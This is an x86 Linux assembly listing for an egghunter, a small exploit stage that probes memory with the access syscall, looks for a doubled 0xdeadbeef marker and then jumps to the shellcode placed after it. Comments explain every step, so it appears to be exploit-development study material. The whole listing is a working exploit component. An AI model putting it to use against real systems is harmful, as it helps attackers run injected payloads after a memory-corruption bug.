global _start

section .text
  _start:
    ; clear the required registers and store the egg
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx
    mov   esi, 0xdeadbeef

  move_to_next_page:
    ; move $edx forward 4095 bytes
    or    dx, 0xfff

  test_next_byte:
    ; load the next byte
    inc   edx

    ; check if the next 8 bytes of memory are accessible
    xor   eax, eax
    mov   al, 0x21
    lea   ebx, [edx + 0x8]
    int   0x80

    ; if the result is EFAULT, the memory
    ; can't be accessed. Move to the next page.
    cmp   al, 0xf2
    je    short move_to_next_page

    ; if the jump wasn't made, the memory
    ; can be accessed. Check if the value
    ; it points to contains the egg.
    cmp   [edx], esi
    jnz   short test_next_byte

    ; if an instance of the egg was found
    ; check if it is appears in the next
    ; dword. If it does, it is a match.
    lea   ebx, [edx + 0x4]
    cmp   [ebx], esi
    jnz   short test_next_byte

    ; if a second instance of the egg was
    ; found, we've found the shellcode and
    ; can execute it.
    lea   edx, [ebx + 0x4]
    jmp   edx
